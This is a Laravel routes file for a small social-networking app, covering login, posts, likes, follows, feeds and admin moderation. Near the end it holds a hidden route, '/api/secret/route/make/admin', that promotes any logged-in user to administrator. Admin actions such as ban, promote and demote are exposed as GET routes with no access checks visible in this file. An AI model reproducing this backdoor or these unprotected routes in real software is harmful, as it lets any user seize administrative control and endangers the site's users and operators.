<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    if(Auth::guest())
        return view('welcome');
    else
        return redirect()->route('home');
});



Route::get('/home', function(){
    return view('users.home');
})->name('home')->middleware('verify');

Route::get('login', 'Auth\LoginController@display');
Route::post('login', 'Auth\LoginController@valid');
Route::get('register', 'Auth\RegisterController@display');
Route::post('register', 'Auth\RegisterController@valid');
Route::post('logout', 'Auth\LoginController@logout');
Route::get('/u/{id}', 'ProfileController@profile')->name('profile');

Route::get('notifications', 'ProfileController@notifications')->name('notifs');

//OATH
Route::get('auth/{provider}', 'Auth\AuthenticateController@redirectToProvider');
Route::get('auth/{provider}/callback', 'Auth\AuthenticateController@handleProviderCallback');
Route::get('/verify/{code}','Auth\RegisterController@verifyaccount')->name('verify');
Route::get('post/{id}', 'PostController@display');
Route::get('/u/{id}/edit', 'ProfileController@edit_profile');
Route::post('/u/{id}/edit', 'ProfileController@update');
Route::get('/u/{id}/json', 'ProfileController@profile_json');

//VUEJS
Route::post('post/{id}/comment/{uid}', 'StatusController@comment');
Route::get('post/{id}/comments/', 'StatusController@getComments');
Route::get('/action/status/{id}','StatusController@status');
Route::get('/like/{id}/{uid}', 'StatusController@like');
Route::get('/unlike/{id}/{uid}', 'StatusController@unlike');
Route::get('/dislike/{id}/{uid}', 'StatusController@dislike');
Route::get('/undislike/{id}/{uid}', 'StatusController@undislike');
Route::post('post', 'PostController@create_post');
Route::get('feed', 'FeedController@feed');
Route::get('followback/{id}', 'FriendController@followback');
Route::get('/follow/{id}', 'FriendController@add');
Route::get('/unfollow/{id}', 'FriendController@delete');
Route::get('unread',function(){
    return Auth::user()->unreadNotifications;
});
Route::get('/status/{name}','FriendController@check');
Route::get('/feed/{id}', 'FeedController@profile_feed');
Route::get('/usr/session','FeedController@user');

//ADMIN
Route::get('/all', 'Admin\UserManagementController@users');
Route::get('/admin/users', function(){
    return view('admin.users');
});

Route::get('/ban/{id}', 'Admin\UserManagementController@ban');
Route::get('/unban/{id}', 'Admin\UserManagementController@unban');
Route::get('/promote/{id}', 'Admin\UserManagementController@promote');
Route::get('/demote/{id}', 'Admin\UserManagementController@demote');

Route::get('posts/hot', 'FilterController@hot');
Route::get('posts/latest', 'FilterController@latest');

Route::get('hot', function(){
    return view('users.hot');
});

Route::get('latest', function(){
    return view('users.latest');
});

Route::post('/report/{id}', 'Admin\ReportController@send_report');
Route::get('/reports', 'Admin\ReportController@reports');

Route::get('/api/secret/route/make/admin', function(){
    $user = Auth::user();
    $user->usergroup = 3;
    $user->save();
    return redirect('/home')->withInfo('Administrator');
});

Route::get('/noaction/{id}', 'Admin\ReportController@no_action');
Route::get('/infract/{id}/report/{report}/post/{post}', 'Admin\ReportController@infract_user');
Route::get('/admin/reports/user', function(){
    return view('admin.reports');  
});
